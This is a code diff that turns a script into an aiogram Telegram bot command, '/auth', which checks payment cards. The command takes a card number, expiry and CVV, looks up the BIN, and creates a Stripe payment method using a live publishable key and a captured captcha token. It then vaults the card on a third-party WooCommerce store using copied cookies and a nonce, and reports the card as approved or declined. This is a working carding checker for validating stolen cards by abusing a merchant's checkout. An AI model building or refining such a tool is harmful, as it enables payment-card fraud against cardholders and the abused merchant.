@@ -1,48 +1,57 @@
+# commands/auth.py
 from aiogram import Router, types
-from aiogram.filters import Command, CommandObject
+from aiogram.filters import Command
 import asyncio
 import requests
 import sys
-import time  # <-- ADDED: needed for time.sleep
 
 router = Router()
 
-# Placeholder for neon() - you can replace with your actual implementation
-def neon(text, color="", delay=0):
-    print(text, end="", flush=True)
-    if delay:
-        time.sleep(delay)
+async def run_sync(func, *args, **kwargs):
+    """Run blocking requests in a thread pool."""
+    return await asyncio.to_thread(func, *args, **kwargs)
 
 @router.message(Command("auth"))
-async def cmd_auth(msg: types.Message, command: CommandObject):
-    # --- Input Validation ---
-    code = command.args
-    if not code:
-        await msg.answer("❌ **Usage:** `/auth CC|MM|YYYY|CVV`")
+async def cmd_auth(message: types.Message):
+    # --- Parse input: /auth CC|MM|YY|CVV  or  CC|MM|YYYY|CVV ---
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        await message.answer(
+            "❌ **Usage:** `/auth CC|MM|YY|CVV` or `/auth CC|MM|YYYY|CVV`\n"
+            "Example: `/auth 4111111111111111|12|28|123` or `/auth 4111111111111111|12|2028|123`"
+        )
         return
 
+    raw = parts[1].strip()
     try:
-        cc, mm, yyyy, cvv = [x.strip() for x in code.split('|')]
+        cc, mm, year_str, cvv = [x.strip() for x in raw.split('|')]
         mm = mm.zfill(2)
-    except:
-        await msg.answer("❌ **Invalid format!** Use: `/auth CC|MM|YYYY|CVV`")
+        # Convert year: if 2-digit, assume 2000+ (e.g., 28 -> 2028)
+        if len(year_str) == 2:
+            yyyy = str(2000 + int(year_str))
+        else:
+            yyyy = year_str
+    except Exception:
+        await message.answer("❌ **Invalid format.** Use: `CC|MM|YY|CVV` or `CC|MM|YYYY|CVV`")
         return
 
-    check_msg = await msg.answer("⏳ **Checking card...**")
+    # Progress message (editable)
+    progress = await message.answer("⏳ **Checking card...**")
 
     try:
         # ========== 1. BIN LOOKUP ==========
+        await progress.edit_text("🔍 **Looking up BIN...**")
         bin6 = cc[:6]
         bin_info = f"🏦 **BIN:** `{bin6}`\n"
         try:
-            r = requests.get(f"https://lookup.binlist.net/{bin6}", timeout=5)
-            if r.status_code == 200:
-                d = r.json()
-                bank = d.get('bank', {}).get('name', 'Unknown')
-                brand = d.get('brand', 'Unknown')
-                ctype = d.get('type', 'Unknown')
-                country = d.get('country', {}).get('name', 'Unknown')
-                prepaid = d.get('prepaid', False)
+            resp = await run_sync(requests.get, f"https://lookup.binlist.net/{bin6}", timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                bank = data.get('bank', {}).get('name', 'Unknown')
+                brand = data.get('brand', 'Unknown')
+                ctype = data.get('type', 'Unknown')
+                country = data.get('country', {}).get('name', 'Unknown')
+                prepaid = data.get('prepaid', False)
                 bin_info += (
                     f"🏛 **Bank:** {bank}\n"
                     f"💳 **Brand:** {brand}\n"
@@ -51,26 +60,21 @@ async def cmd_auth(msg: types.Message, command: CommandObject):
                     f"💳 **Prepaid:** {'YES' if prepaid else 'NO'}\n"
                 )
             else:
-                bin_info += "⚠️ **BIN Lookup Failed**\n"
+                bin_info += "⚠️ **BIN lookup failed**\n"
         except Exception as e:
-            bin_info += f"❌ **BIN Error:** {str(e)}\n"
+            bin_info += f"❌ **BIN error:** {str(e)}\n"
 
-        # ========== 2. STRIPE API CALL ==========
+        # ========== 2. STRIPE API (create payment method) ==========
+        await progress.edit_text("💳 **Sending to Stripe...**")
         headers = {
             'accept': 'application/json',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
-            'priority': 'u=1, i',
             'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
         }
+        # The long data string – same as your Termux script
         data = (
             f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yyyy}&'
             f'card[exp_month]={mm}&allow_redisplay=unspecified&'
@@ -92,11 +96,11 @@ async def cmd_auth(msg: types.Message, command: CommandObject):
             f'key=pk_live_51RnLhiKXxVMmJZXpcM0iYR1eqQdP0DP9q8NztbmmwPLMgUolXd3l4xMrJrgJdCb1Ht8jA8uVc2NQ6cffhZgD4GIM00kwsSeJCQ&'
             f'_stripe_version=2024-06-20&'
             f'radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzc1MzkzOTc4LCJjZGF0YSI6Ik84by9BcnNRczZKcFN3Q3FjNXJXWnRDa0wwckIxeW1ydEZxSEo0NFc5c2s3c0swVkYyK2ZVR1dPRVBUYzFlcnphS3RneS9CcE11LzlBb1RsWDJrcE5tK0IzMWl5TUJWaHZTQmxibDkwRkhURXF6WUFXOHkwU3dlV1I0Y1Rmbk5tSkJqa1hKeEFCcWhMZUc1bGY1RFpFbWhvVVQzdnJVNUgzSEVoV2YzSVhSaDV3YkZhVHBCS3l1Q3k4UWZLZ2F4a21GeXE0S3d1MUFUMzN5d2hSczRNTXdEZ2E5REs3clR0ZEZxTnBlWVlNNVl0elpuZjV4SDBiQnVGRHorbjJqb3RKWHd1N0NSWE9PdDNZYVBXME5mSmV4NU95bElEa2RrdGpHV2RLb3RPa2E2YzZBYjJtbTBQNkJtL1BkM1o0Sm5JYWFoMm5VeVAxRjA5dllKWG9VYnp1MDJOVlFkWTRPWlpnVGR5L1JaWlFoST1kbzBaRG9iTzYzSHlNUE8zIiwicGFzc2tleSI6IkFuZDRoaWdycXhCdHVnb1BpS2VlNXhaaTE0Z3IxV2FsUzhia3dpVitlOExwcVduNmxic3lDU1lOU2hTaFF0WjBBc2REY2lKTXlhNDlVWXNTeWhnZDNtMTBIbStNZENNb05QYVorNHlVSURwY2Zxd3BwUHdzdGV5Q3VqSm42SWJXVkhKenh6K1lncVF4L0ZKUnRMeWV4WENoR0tVNDY3U1FSZ2R5dm1pWFUvWllGQTlPWWoyTjhXb3V5VmZpdGEvbEhNb0NWQXlYUk81TzZmei9FZDNpb3ljYzVjNXJlMVlZT3FZcW83Q1lXTHRoZndvMVpQbUJvL0NqTDFXaXN4d0Z3dDVNcUZuR2dmN2FYV0l6blcvRHEzaW1CbUdiV1JVRG04emIycVNpNERNK1ZYRGd1TFZFMWN5N1dkUGk4TEVQcEhqWTVVR1JycXRzTy9peTIxZEQ4MVI5WFlyaWhnLzdHU2tIaEt6TmVaa3FWU3pxTGVpNFp6bVBuTlA4Nmh6SEk4ODk5cnQyRVp5N3hSSFRsZ3lIZXpIQWpWWjBXRzR0TTByN0IybnBka2NpT1M5L2lWSi9SRDV2NXFlS1p3Vm5MV3UySU9hL0lETDA0akkrOE9UY1RBcGFKWVZnc2lyVWJyZ0JqaFRLTjBLdm51cEtGV2JTMk9BOFNyU3Z1OFFvejd3ZjltNmFmeXpCUFpBY3BoUURmSFBQQU5vNjRtY3FRN1JTN3VQLzA2TDBmd2lxNHU4ZVBLOUV4ek5YOWQyVHpwZExvTktZUDF5MVo1bzI3SGJybEJXMTUvNHljbkY3bzBLZGlkOWloR3I5dnpEV0UzNE4zbzdKcU1lSkxRYmJUKzlPeVZhRThTT0hUdmJ1MjN5MXlDNW1LckZNUmVTZyszN3RyNUlGS2JFUmNmZEtUeHlBTCtsWEZlVFBVZTg2RTBJMTJrRmxUbE1iUFJqQXh3Y0cxRllBbVpha01kSVJ4Y1BnYU4yRkdGRmRUYzkxSWhKUG1kenpDVXA1V1V1eERtTXhUMUprNzhMR3J0dkhRbWp1em1TcDlXN2JJYWxwbVJEVGlsdFJuSWVDMmVlMzgvYTNldFlDaW1TQ2wzbU04MWxHRm9tMGFjSHpPMlpidjJMYm9BSTU3aHV1SzREVm42ZWN0QTVibVlpY0g3anppNE1wUlYyeUNiOTlWZkNoSE9jTzJ6YXY0RlFPUFpvQktLS3JBV3djemFYZGhpUXZ2NTh3MlJ4L0x0VDhpM1lPaTdMRGhFSmFNdWw1NzdXTHdwcFpHV3JhUXlxNURUOTFnbzNtTjJ5RWlBdjJOcitydElXYkdMMVN4Z0xjSU9MK01LUUVERTRGS2ZVaU5GY1REeUFMcC9uRU5PSjVaaDR3ckhzTUxXcGd6eHpoL2cxOFp4TlJkaUNuZEZ5K3Z5bllQL3ozbjA4ZVRyVlBISTB1N1kxRnoyTXJiZDdWNVdKY0ZDQkxqWHFiSjR0bHZJV0ExRHM1d0JWMGkzbmUxTDkzTkMyUEphczhJL3htcjhYZTZ6eXBJTHVIR0I2NTlJNVYrRjg3dWRsQlFEeTV5YUgvcWoyMWUxTXRWLzU1cVJwdE45akR5aS90b2dLNmRFVFc2WjZKL2FoNWs2WEs1SG0xL3BFNkVIVGhTMjFac3RTVk9Pd0tDM0ZYQ2RZclZ1UlQ0OUJKWWtBeGtYZEJhUVJyZm1vVVB2bUV6SzhlWGlqWmppVlhFTWNmS2ZlSnRIUEV5dFdSbW5tdHZHdUtQbkZ5Qml0V0RvUUswYndaNzZBL1ZOSlpnN0hxK0tUa01JSWlqcTlEVGU5cEFwSXVseHhnMkIyeFkwWngvZk11VkhWVFBRRjkwaExlYWFDZm5mTTE4R01qVEx2Q0RndWlUQ3lUeCtGYW8wRmQ3NlR0R3owUUd3QWx2YjE0RVpSNlYzMVdobUVsMTlob2JCcUROalV5azdPK0ZRUGE2d0ExK0ZwQXF4VTM1dFlQdFpUU0ZHSlNEcDNxY2NXWE9QWDVramZwS3RWOTlseHhuWXJDSUxYZldMNHBJdVlNQnM5b2ZRNEQxZ3JPdlVyVUNOa096c25nTlJKTGozSlV3ZWdVL2VLQTczMXMyTVMveWtuSCtZNHZYYjZaNFJnQ3M2Z3NZNC9CYWpoS05jdHM0RUZISU1KT3FrWU8xTUFCdFZHaU8vU2xSQTlCb2QvMDE2YnhwdXNYNUpCcW1IUVhRNmJ4ZHJMTDFReGptOTdydVJhbG9jNVk3TjFHb3NVZVdJK05pVysrQ2p1a1d0ejZKMHFkSVJydEw0SEtPVTg5MmNMeUU0dDJyeEVKSUZ6cGx1TmxpK3M2WGp1aTZ1UlB2dWVxd2lZZmJadjFUUFEwMVQxblZhdUNhakovd1cveGZySXhHaDMrL0F3bE5PSEJuL09xZkowVlFjdGlMdzN6cnNSRW9XSlVXM1FOSHJsazVadDgvUnl2dmUvQlBwMFYyN0M1ZVJ5UWUvK3UxbzJPYmFqYVVCaTloNFRDRnF3RjBTRmNWZnIybTdPMmRRR3p6OGdZa1dRUEt2SGVvUllsZW1Fc0FlU3Zua25ZY1lJUExIVnRSRURrdlp2OTNEZ3NGNHpCWEMrWmtDOTA0cHB5TW94WDdjM296ekhrQllqMVovTVYzWk96WnBJcTNYaVRyNjBvQmZTZk1kS3hRNXFHcnBUSlJtSXpsTWJ2czE3UFZpbW5OUDlpMXdtZnljeDUxNXhlNERBOVFmZUk4RW9GdVlncXRpNkZBQW9Jb3dIZEFJSDJQdzl1K0trYmZhUzAxaUVPZGxCU3FkRTZ2R2lqQ0RPTTg4a1hrbjdQMHZrc21LZzAwSkFPTXFqMDlDTzJmN0VRcFUrNFBvWXowTDlDRjBhY2swcmdIdz09Iiwia3IiOiI0NDg1NmMxMyIsInNoYXJkX2lkIjozNjI0MDY5OTZ9.J6r1-o8JG8I4VcfrIYx3ulp7zva4duHMtIHCYca0j3M'
-        )  # <-- Closing parenthesis
+        )
+        response = await run_sync(requests.post, 'https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
-        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-
-        # ========== 3. SECOND REQUEST ==========
+        # ========== 3. WORDPRESS VAULT REQUEST ==========
+        await progress.edit_text("🔄 **Vaulting with merchant...**")
         cookies = {
             '_cq_duid': '1.1775393534.EuVaXrpREcFZJZ4y',
             '_cq_suid': '1.1775393534.sbS4UMPGI40xI0Wz',
@@ -131,14 +135,7 @@ async def cmd_auth(msg: types.Message, command: CommandObject):
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'origin': 'https://dermajem.com',
-            'priority': 'u=1, i',
             'referer': 'https://dermajem.com/my-account/add-payment-method/',
-            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
             'x-requested-with': 'XMLHttpRequest',
         }
@@ -149,14 +146,17 @@ async def cmd_auth(msg: types.Message, command: CommandObject):
             'wc-stripe-payment-type': 'card',
             '_ajax_nonce': 'f443edbadd',
         }
-        response2 = requests.post('https://dermajem.com/', params=params, cookies=cookies, headers=headers2, data=data2)
+        response2 = await run_sync(requests.post, 'https://dermajem.com/', params=params, cookies=cookies, headers=headers2, data=data2)
 
-        # ========== RESULT ==========
+        # ========== 4. RESULT ==========
         if response2.status_code == 200 and ('"success":true' in response2.text or 'succeeded' in response2.text.lower()):
-            neon("\n✅ APPROVED: Card successfully added to vault\n", "green", 0.001)
-            sys.stdout.write("\033[92m⚡⚡⚡ VAULTED ⚡⚡⚡\033[0m\n")
+            await progress.edit_text(
+                f"{bin_info}\n\n✅ **APPROVED**\nCard successfully added to vault.\n⚡⚡⚡ VAULTED ⚡⚡⚡"
+            )
         else:
-            neon("\n❌ DECLINED: Your card was declined.\n", "red", 0.001)
+            await progress.edit_text(
+                f"{bin_info}\n\n❌ **DECLINED**\nYour card was declined."
+            )
 
     except Exception as e:
-        await msg.answer(f"❌ **Error:** {str(e)}")
+        await progress.edit_text(f"❌ **Error:** {str(e)}")
